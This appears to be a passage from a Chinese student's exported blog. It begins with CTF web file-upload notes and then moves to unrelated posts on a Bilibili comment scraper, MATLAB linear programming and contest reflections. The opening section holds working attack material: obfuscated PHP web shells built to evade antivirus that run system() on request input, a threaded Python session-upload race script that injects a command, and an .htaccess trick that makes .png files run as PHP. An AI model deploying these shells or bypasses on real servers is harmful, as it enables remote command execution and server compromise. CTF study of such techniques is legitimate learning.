<span class="variable">$correctImage</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$extraBytes</span>, <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="variable">$errstr</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$m</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="variable">$extraBytes</span> = (<span class="keyword">int</span>)<span class="variable">$m</span>[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$binData</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$size</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$order</span> = <span class="literal">false</span>, <span class="variable">$fromString</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;order = <span class="variable">$order</span>;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$fromString</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!file_exists(<span class="variable">$filename</span>) || !is_file(<span class="variable">$filename</span>))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = file_get_contents(<span class="variable">$filename</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = <span class="variable">$filename</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;size = strlen(<span class="keyword">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">$this</span>-&gt;size - strlen(<span class="keyword">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params"><span class="variable">$skip</span></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="variable">$skip</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;eof()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$byte</span> = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> ord(<span class="variable">$byte</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$short</span> = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;order) &#123;</span><br><span class="line">                <span class="variable">$short</span> = (ord(<span class="variable">$short</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + ord(<span class="variable">$short</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$short</span> = (ord(<span class="variable">$short</span>[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + ord(<span class="variable">$short</span>[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$short</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="keyword">$this</span>-&gt;binData||(strlen(<span class="keyword">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="免杀马"><a href="#免杀马" class="headerlink" title="免杀马"></a>免杀马</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;s#y#s#t#e#m&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = explode(<span class="string">&quot;#&quot;</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$b</span>[<span class="number">0</span>].<span class="variable">$b</span>[<span class="number">1</span>].<span class="variable">$b</span>[<span class="number">2</span>].<span class="variable">$b</span>[<span class="number">3</span>].<span class="variable">$b</span>[<span class="number">4</span>].<span class="variable">$b</span>[<span class="number">5</span>];</span><br><span class="line"><span class="variable">$c</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=substr(<span class="string">&#x27;1s&#x27;</span>,<span class="number">1</span>).<span class="string">&#x27;ystem&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=strrev(<span class="string">&#x27;metsys&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">a=system&amp;b=ls</span><br></pre></td></tr></table></figure>

<h2 id="session竞争上传"><a href="#session竞争上传" class="headerlink" title="session竞争上传"></a>session竞争上传</h2><p>先上传.user.ini包含如下语句</p>
<pre><code>&lt;?=include&quot;/tmp/sess_haorical&quot;?&gt;
</code></pre>
<p>跑脚本</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">session=requests.session()</span><br><span class="line">sess=<span class="string">&#x27;haorical&#x27;</span></span><br><span class="line">url1=<span class="string">&quot;http://f275f432-9203-4050-99ad-a185d3b6f466.chall.ctf.show/&quot;</span></span><br><span class="line">url2=<span class="string">&quot;http://f275f432-9203-4050-99ad-a185d3b6f466.chall.ctf.show/upload&quot;</span></span><br><span class="line">data1=&#123;</span><br><span class="line">	<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;&lt;?php system(&quot;tac ../f*&quot;);?&gt;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">file=&#123;</span><br><span class="line">	<span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;heiheihei&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">cookies=&#123;</span><br><span class="line">	<span class="string">&#x27;PHPSESSID&#x27;</span>: sess</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>():</span></span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		r = session.post(url1,data=data1,files=file,cookies=cookies)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>():</span></span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		r = session.get(url2)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">			print(r.text)</span><br><span class="line">			</span><br><span class="line">threads = [threading.Thread(target=write),</span><br><span class="line">       threading.Thread(target=read)]</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">	t.start()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="htaccess绕过"><a href="#htaccess绕过" class="headerlink" title=".htaccess绕过"></a>.htaccess绕过</h2><p>上传.htaccess</p>
<p>内容如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .png   //将.png后缀的文件解析 成php</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> &quot;<span class="attr">png</span>&quot;&gt;</span></span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br><span class="line"></span><br><span class="line">php_value auto_prepend_file &quot;shell.png&quot; </span><br><span class="line">#效果和.user.ini一样，然后通过访问加载php页面可以触发.htaccess的指令</span><br></pre></td></tr></table></figure>

<h2 id="appach解析漏洞"><a href="#appach解析漏洞" class="headerlink" title="appach解析漏洞"></a>appach解析漏洞</h2><p>apache遇到无法识别解析的文件后缀时，会向前解析，如xxx.php.123.456,在mime.types文件中如果不存在.123/.456这两种后缀，那么apache会将该文件解析为php。</p>
<p>比如1.php.jgp</p>
]]></content>
      <categories>
        <category>ctf学习</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>暑假总结</title>
    <url>/posts/123f4dc2/</url>
    <content><![CDATA[<p>不知不觉暑假结束了，这两天写完实习报告终于有时间能简单的总结一下了。</p>
<ul>
<li><p>python入门到精通</p>
</li>
<li><p>数学建模学了一点点，matlab基本是会用了</p>
</li>
<li><p>ctf把bugku上的web刷完了，正在刷buu，学的东西还挺多的，也打了几次线上，感觉好难，道阻且长</p>
</li>
<li><p>折腾服务器，搭建了私有云</p>
</li>
<li><p>linux 使用的更熟练了，包括docker了等等</p>
</li>
<li><p>学会了git使用外加GitHub，之前不是很会</p>
</li>
<li><p>洛克王国天梯打到了高级段位</p>
</li>
</ul>
]]></content>
      <categories>
        <category>随笔</category>
      </categories>
  </entry>
  <entry>
    <title>爬取冰冰vlog.001评论&amp;&amp;做词云</title>
    <url>/posts/6d65a59f/</url>
    <content><![CDATA[<blockquote>
<p>python小白，纯属来玩的（狗头）</p>
</blockquote>
<h1 id="库准备（推荐清华镜像安装）"><a href="#库准备（推荐清华镜像安装）" class="headerlink" title="库准备（推荐清华镜像安装）"></a>库准备（推荐清华镜像安装）</h1><ol>
<li>requests</li>
<li>bs4</li>
<li>jieba</li>
<li>wordcloud</li>
<li>imageio</li>
<li>matplotlib</li>
</ol>
<h1 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h1><h2 id="爬取评论"><a href="#爬取评论" class="headerlink" title="爬取评论"></a>爬取评论</h2><blockquote>
<p>代码直接贴上了，自行研究</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_html</span>(<span class="params">url</span>):</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    r = requests.get(url, timeout=<span class="number">30</span>,headers=headers)</span><br><span class="line">    r.raise_for_status()</span><br><span class="line">    r.endcodding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> r.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_content</span>(<span class="params">url</span>):</span></span><br><span class="line">    comments = []</span><br><span class="line">    html = get_html(url)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s=json.loads(html)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">&quot;jsonload error&quot;</span>)   </span><br><span class="line">    num=<span class="built_in">len</span>(s[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;replies&#x27;</span>]) </span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i&lt;num:</span><br><span class="line">        comment=s[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;replies&#x27;</span>][i]</span><br><span class="line">        InfoDict=&#123;&#125;</span><br><span class="line">        InfoDict[<span class="string">&#x27;Uname&#x27;</span>]=comment[<span class="string">&#x27;member&#x27;</span>][<span class="string">&#x27;uname&#x27;</span>]</span><br><span class="line">        InfoDict[<span class="string">&#x27;Like&#x27;</span>]=comment[<span class="string">&#x27;like&#x27;</span>] </span><br><span class="line">        InfoDict[<span class="string">&#x27;Content&#x27;</span>]=comment[<span class="string">&#x27;content&#x27;</span>][<span class="string">&#x27;message&#x27;</span>] </span><br><span class="line">        InfoDict[<span class="string">&#x27;Time&#x27;</span>]=time.strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>,time.localtime(comment[<span class="string">&#x27;ctime&#x27;</span>])) </span><br><span class="line">        comments.append(InfoDict)</span><br><span class="line">        i=i+<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> comments</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Out2File</span>(<span class="params"><span class="built_in">dict</span></span>):</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;BiliBiliComments.txt&#x27;</span>, <span class="string">&#x27;a+&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        i=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> comment <span class="keyword">in</span> <span class="built_in">dict</span>:</span><br><span class="line">            i=i+<span class="number">1</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                f.write(<span class="string">&#x27;姓名：&#123;&#125;\t  点赞数：&#123;&#125;\t \n 评论内容：&#123;&#125;\t  评论时间：&#123;&#125;\t \n &#x27;</span>.<span class="built_in">format</span>(</span><br><span class="line">                    comment[<span class="string">&#x27;Uname&#x27;</span>], comment[<span class="string">&#x27;Like&#x27;</span>], comment[<span class="string">&#x27;Content&#x27;</span>], comment[<span class="string">&#x27;Time&#x27;</span>]))</span><br><span class="line">                f.write(<span class="string">&quot;-----------------\n&quot;</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                print(<span class="string">&quot;out2File error&quot;</span>)</span><br><span class="line">        print(<span class="string">&#x27;当前页面保存完成&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    e=<span class="number">0</span></span><br><span class="line">    page=<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> e == <span class="number">0</span> :</span><br><span class="line">        url = <span class="string">&quot;https://api.bilibili.com/x/v2/reply?pn=&quot;</span>+ <span class="built_in">str</span>(page)+<span class="string">&quot;&amp;type=1&amp;oid=800760067&amp;sort=2&quot;</span> </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            print()</span><br><span class="line">            content=get_content(url)</span><br><span class="line">            print(<span class="string">&quot;page:&quot;</span>,page)</span><br><span class="line">            Out2File(content)</span><br><span class="line">            page=page+<span class="number">1</span></span><br><span class="line">            <span class="comment"># 为了降低被封ip的风险，每爬20页便歇5秒。</span></span><br><span class="line">            <span class="keyword">if</span> page%<span class="number">10</span> == <span class="number">0</span>:</span><br><span class="line">                time.sleep(<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            e=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<h2 id="生成词云"><a href="#生成词云" class="headerlink" title="生成词云"></a>生成词云</h2><p>这个需要先有个图片，随便网上找，然后和py放在一个文件夹下。</p>
<blockquote>
<p>代码附上（文件，图片改成自己的）</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> jieba.analyse</span><br><span class="line"><span class="keyword">from</span> wordcloud <span class="keyword">import</span> WordCloud,ImageColorGenerator</span><br><span class="line"><span class="keyword">from</span> imageio <span class="keyword">import</span> imread</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">wc</span>:</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,txt_file,img_file,font_file</span>):</span></span><br><span class="line">    self.f = <span class="built_in">open</span>(txt_file,encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    self.txt = self.f.read()  </span><br><span class="line">    self.f.close()</span><br><span class="line">    self.tags = jieba.analyse.extract_tags(self.txt,topK=<span class="number">100</span>)</span><br><span class="line">    self.text = <span class="string">&#x27; &#x27;</span>.join(self.tags)</span><br><span class="line">    self.img = imread(img_file)</span><br><span class="line">    self.wc = WordCloud(font_path=font_file,background_color=<span class="string">&#x27;white&#x27;</span>,max_words=<span class="number">100</span>,mask=self.img,max_font_size=<span class="number">80</span>)</span><br><span class="line">    self.word_cloud = self.wc.generate(self.text)</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">show_wc</span>(<span class="params">self</span>):</span></span><br><span class="line">    plt.imshow(self.word_cloud)</span><br><span class="line">    plt.axis(<span class="string">&quot;off&quot;</span>)</span><br><span class="line">    plt.show()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  mywc = wc(<span class="string">&#x27;BiliBiliComments.txt&#x27;</span>,<span class="string">&#x27;u=2959490536,2877096479&amp;fm=26&amp;gp=0.jpg&#x27;</span>,<span class="string">&#x27;simsun.ttc&#x27;</span>)</span><br><span class="line">  mywc.show_wc()</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>还是那句话，冰冰真可爱（狗头）</strong></p>
</blockquote>
]]></content>
      <categories>
        <category>哎，我就是玩</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>线性规划与整数线性规划</title>
    <url>/posts/dea132b6/</url>
    <content><![CDATA[<h1 id="线性规划"><a href="#线性规划" class="headerlink" title="线性规划"></a>线性规划</h1><blockquote>
<p>最近在学数学建模，把代码和遇到的问题记录一下</p>
</blockquote>
<h2 id="基本类型"><a href="#基本类型" class="headerlink" title="基本类型"></a>基本类型</h2><p>基本直接套函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">[x，fval]=linprog(f,A,b,Aeq,beq,lb,ub)</span><br></pre></td></tr></table></figure>
<p>x返回决策向量取值，fval返回最优解，f目标函数，A,b线性不等式约束，Aeq,beq线性等式约束，lb,ub界值向量</p>
<p>一般都是矩阵形式</p>
<p>一个easy题，把代码复习一下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">max z=<span class="number">2</span>x1+<span class="number">3</span>x2<span class="number">-5</span>x3,</span><br><span class="line">s.t.</span><br><span class="line">x1+x2+x3=<span class="number">7</span>,</span><br><span class="line"><span class="number">2</span>x1<span class="number">-5</span>x2+x3&gt;=<span class="number">10</span>,</span><br><span class="line">x1+<span class="number">3</span>x2+x3&lt;=<span class="number">12</span>,</span><br><span class="line">x1,x2,x3&gt;=<span class="number">0</span></span><br></pre></td></tr></table></figure>
<p>程序如下</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">f=[-<span class="number">2</span>;-<span class="number">3</span>;-<span class="number">5</span>];</span><br><span class="line">a=[-<span class="number">2</span> <span class="number">5</span> -<span class="number">1</span>;<span class="number">1</span> <span class="number">3</span> <span class="number">1</span>];</span><br><span class="line">b=[-<span class="number">10</span>;<span class="number">12</span>];</span><br><span class="line">aeq=ones(<span class="number">1</span>,<span class="number">3</span>);</span><br><span class="line">beq=<span class="number">7</span>;</span><br><span class="line">[x,y]=linprog(f,a,b,aeq,beq,zeros(<span class="number">3</span>,<span class="number">1</span>));</span><br></pre></td></tr></table></figure>
<h2 id="特殊类型"><a href="#特殊类型" class="headerlink" title="特殊类型"></a>特殊类型</h2><p>即带绝对值的，也挺简单的，改一下模型就行，用lingo可以直接求</p>
<h2 id="一类问题"><a href="#一类问题" class="headerlink" title="一类问题"></a>一类问题</h2><p>主要就是投资的收益和风险，具体问题具体分析，大部分可以简化模型，比如固定一个值，优化另一个，再用循环改变固定值</p>
<h1 id="整数规划"><a href="#整数规划" class="headerlink" title="整数规划"></a>整数规划</h1><h2 id="0-1型整数规划"><a href="#0-1型整数规划" class="headerlink" title="0-1型整数规划"></a>0-1型整数规划</h2><h3 id="相互排斥"><a href="#相互排斥" class="headerlink" title="相互排斥"></a>相互排斥</h3><p>改写约束条件，比如</p>
<p>x=0或500&lt;x&lt;800</p>
<p>改写为 500y&lt;x&lt;800y,y=0或1</p>
<p>思路比较灵活，有时候需要引入M(充分大)</p>
<h3 id="指派问题"><a href="#指派问题" class="headerlink" title="指派问题"></a>指派问题</h3><p>直接用intlinprog,比linprog多了个参数intcon,还是比较复杂的，需要把多维变量转变成一维向量</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">clc,clear</span><br><span class="line">c=[<span class="number">3</span> <span class="number">8</span> <span class="number">2</span> <span class="number">10</span> <span class="number">3</span>;</span><br><span class="line">   <span class="number">8</span> <span class="number">7</span> <span class="number">2</span> <span class="number">9</span> <span class="number">7</span>;</span><br><span class="line">   <span class="number">6</span> <span class="number">4</span> <span class="number">2</span> <span class="number">7</span> <span class="number">5</span>;</span><br><span class="line">   <span class="number">8</span> <span class="number">4</span> <span class="number">2</span> <span class="number">3</span> <span class="number">5</span>;</span><br><span class="line">   <span class="number">9</span> <span class="number">10</span> <span class="number">6</span> <span class="number">9</span> <span class="number">10</span>;]; <span class="comment">//系数矩阵</span></span><br><span class="line">c=reshape(c,[<span class="number">25</span> <span class="number">1</span>]);</span><br><span class="line">a=zeros(<span class="number">10</span>,<span class="number">25</span>);</span><br><span class="line">intcon=<span class="number">1</span>:<span class="number">25</span>;</span><br><span class="line"><span class="keyword">for</span> i=<span class="number">1</span>:<span class="number">5</span></span><br><span class="line">    a(i,(i<span class="number">-1</span>)*<span class="number">5</span>+<span class="number">1</span>:<span class="number">5</span>*i)=<span class="number">1</span>;</span><br><span class="line">    a(<span class="number">5</span>+i,i:<span class="number">5</span>:<span class="number">25</span>)=<span class="number">1</span>;</span><br><span class="line">end</span><br><span class="line">b=ones(<span class="number">10</span>,<span class="number">1</span>);</span><br><span class="line">lb=zeros(<span class="number">25</span>,<span class="number">1</span>);</span><br><span class="line">ub=ones(<span class="number">25</span>,<span class="number">1</span>);</span><br><span class="line">x=intlinprog(c,intcon,[],[],a,b,lb,ub);</span><br><span class="line">x=reshape(x,[<span class="number">5</span> <span class="number">5</span>])</span><br></pre></td></tr></table></figure>

<h2 id="蒙特卡洛法"><a href="#蒙特卡洛法" class="headerlink" title="蒙特卡洛法"></a>蒙特卡洛法</h2><p>很经典的随机模拟方法，直接上代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mengte.m函数文件</span><br><span class="line">function[f,g]=mengte(x)</span><br><span class="line">f=x(<span class="number">1</span>)^<span class="number">2</span>+x(<span class="number">2</span>)^<span class="number">2</span>+<span class="number">3</span>*x(<span class="number">3</span>)^<span class="number">2</span>+<span class="number">4</span>*x(<span class="number">4</span>)^<span class="number">2</span>+<span class="number">2</span>*x(<span class="number">5</span>)^<span class="number">2</span><span class="number">-8</span>*x(<span class="number">1</span>)<span class="number">-2</span>*x(<span class="number">2</span>)<span class="number">-3</span>*x(<span class="number">3</span>)-x(<span class="number">4</span>)<span class="number">-2</span>*x(<span class="number">5</span>);</span><br><span class="line">g=[sum(x)<span class="number">-400</span></span><br><span class="line">    x(<span class="number">1</span>)+<span class="number">2</span>*x(<span class="number">2</span>)+<span class="number">2</span>*x(<span class="number">3</span>)+x(<span class="number">4</span>)+<span class="number">6</span>*x(<span class="number">5</span>)<span class="number">-800</span></span><br><span class="line">    <span class="number">2</span>*x(<span class="number">1</span>)+x(<span class="number">2</span>)+<span class="number">6</span>*x(<span class="number">3</span>)<span class="number">-200</span></span><br><span class="line">    x(<span class="number">3</span>)+x(<span class="number">4</span>)+<span class="number">5</span>*x(<span class="number">5</span>)<span class="number">-200</span>];</span><br></pre></td></tr></table></figure>

<p>测试代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">rng(sum(clock));</span><br><span class="line">p0=<span class="number">0</span>;</span><br><span class="line">tic</span><br><span class="line"><span class="keyword">for</span> i=<span class="number">1</span>:<span class="number">10</span>^<span class="number">6</span></span><br><span class="line">    x=randi([<span class="number">0</span>,<span class="number">99</span>],<span class="number">1</span>,<span class="number">5</span>);</span><br><span class="line">    [f,g]=mengte(x);</span><br><span class="line">    <span class="function"><span class="keyword">if</span> <span class="title">all</span><span class="params">(g&lt;=<span class="number">0</span>)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">if</span> p0&lt;f</span></span><br><span class="line"><span class="function">            x0</span>=x;p0=f;</span><br><span class="line">        end</span><br><span class="line">    end</span><br><span class="line">end</span><br><span class="line">x0,p0</span><br><span class="line">toc</span><br></pre></td></tr></table></figure>

<blockquote>
<p>暂时写这么多，碰到问题再补充</p>
</blockquote>
]]></content>
      <categories>
        <category>数学建模</category>
      </categories>
      <tags>
        <tag>matlab</tag>
        <tag>数学建模</tag>
      </tags>
  </entry>
  <entry>
    <title>蓝桥杯感想</title>
    <url>/posts/c4930d9e/</url>
    <content><![CDATA[<blockquote>
<p>人在宿舍，刚下考场</p>
</blockquote>
<h2 id="小记"><a href="#小记" class="headerlink" title="小记"></a>小记</h2><p>今年第一次参加，以后也不会参加了，还是专心打ctf好。<br>差不多一小时做题，三小时挂机。感觉全是搜索，的确是暴力杯，无奈一星期速成的算法功底，的确太拉了。考试前笔还被我摔坏了，全程脑子想。而且数据结构的题偏多，但我还没学，无奈用离散数学的知识做了做（打表）。</p>
<h2 id="题目情况"><a href="#题目情况" class="headerlink" title="题目情况"></a>题目情况</h2><p>总体来说也就那样，感觉比去年难。</p>
<p>前两道填空简简单单，第一个直接打表。</p>
<p>第二个用set去重一直报bug，最后也不知道哪错了。</p>
<p>第三个2个for循环，暴力就行，跑了大概1分钟出结果了。</p>
<p>第四个找路径，搜了搜，没出结果。</p>
]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>蓝桥杯</tag>
      </tags>
  </entry>
  <entry>
    <title>python_0x01</title>
    <url>/posts/e0aa9926/</url>
    <content><![CDATA[<blockquote>
<p>系统学一下python，简单的复制粘贴并加入一点点思考，今天简单写了写感觉还挺爽，洋洋洒洒好几千行，把基础的学完了，应该跟比其他人大一学的python多一点点，感觉已经可以用来当复习资料了。</p>
</blockquote>
